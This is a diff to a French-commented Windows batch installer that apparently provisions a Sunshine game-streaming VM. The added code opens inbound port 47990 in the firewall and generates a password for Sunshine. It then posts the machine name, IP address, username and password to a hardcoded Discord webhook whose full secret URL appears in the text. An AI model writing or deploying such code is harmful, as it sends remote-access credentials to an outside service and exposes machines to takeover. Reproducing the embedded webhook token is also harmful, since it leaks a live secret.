@@ -150,15 +150,53 @@ echo Ports configuration completed.
 
 REM Section 3: Setting up Webhook Messages
 
-echo Setting up Sunshine webhook messages...
-REM Content from sunshine_setup_webhook_messages.bat
-echo {"webhook":"example-webhook-url","events":"all"} > webhook_config.json
-curl -X POST -H "Content-Type: application/json" -d @webhook_config.json http://localhost:5000/webhooks/setup
+setlocal enabledelayedexpansion
 
-:: Script terminé
-echo Installation and cleanup completed.
-pause
-exit /b 0
+:: 1. Récupérer le nom de l'ordinateur
+set "COMPUTER_NAME=%COMPUTERNAME%"
+
+:: 2. Récupérer l'adresse IPv4
+for /f "tokens=2 delims=:" %%A in ('ipconfig ^| findstr "IPv4"') do set "IP_ADDRESS=%%A"
+set "IP_ADDRESS=%IP_ADDRESS: =%"  :: Enlever les espaces
+
+:: Si aucune adresse IPv4 n'est trouvée, essayer d'obtenir l'IPv6
+if not defined IP_ADDRESS (
+    for /f "tokens=2 delims=:" %%A in ('ipconfig ^| findstr "IPv6"') do set "IP_ADDRESS=%%A"
+    set "IP_ADDRESS=%IP_ADDRESS: =%"  :: Enlever les espaces
+)
+
+:: 3. Ouvrir le port 47990 dans le pare-feu
+netsh advfirewall firewall add rule name="Ouvrir Port 47990" dir=in action=allow protocol=TCP localport=47990
+
+:: 4. Générer un mot de passe robuste aléatoire
+set "PASSWORD="
+set "CHARSET=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
+set "LENGTH=15"
+
+:: Boucle pour générer le mot de passe
+for /L %%i in (1,1,%LENGTH%) do (
+    set /a "RANDOM_INDEX=!RANDOM! %% 62"
+    for %%j in (!RANDOM_INDEX!) do (
+        set "PASSWORD=!PASSWORD!!CHARSET:~%%j,1!"
+    )
+)
+
+:: 5. Définit les identifiants de Sunshine
+set "USERNAME=Sunshine"
+set "USER_PASSWORD=%PASSWORD%"
+
+:: 6. Préparer le message à envoyer au webhook Discord
+set "WEBHOOK_URL=https://discord.com/api/webhooks/1294633030635360339/RYnF8JJBXCgUfkpQwBSZ3CdSs6fdHOiq7qH1Q9mg73qL4D4oV23nlYbqs55TE3-EDgSE"
+set "MESSAGE={\"content\":\"Nom de la VM : %COMPUTER_NAME%, Adresse IP : %IP_ADDRESS%, Identifiant : %USERNAME%, Mot de passe : %USER_PASSWORD%\"}"
+
+:: 7. Envoyer le message au webhook Discord
+powershell -Command "Invoke-RestMethod -Uri '%WEBHOOK_URL%' -Method POST -ContentType 'application/json' -Body '%MESSAGE%'"
+
+:: 8. Lancer Sunshine avec les identifiants définis
+"C:\Program Files\Sunshine\sunshine.exe" --creds %USERNAME% %USER_PASSWORD%
+
+:: Fin du script
+endlocal
 
 REM End of Combined Script
 echo All actions have been executed. Exiting...
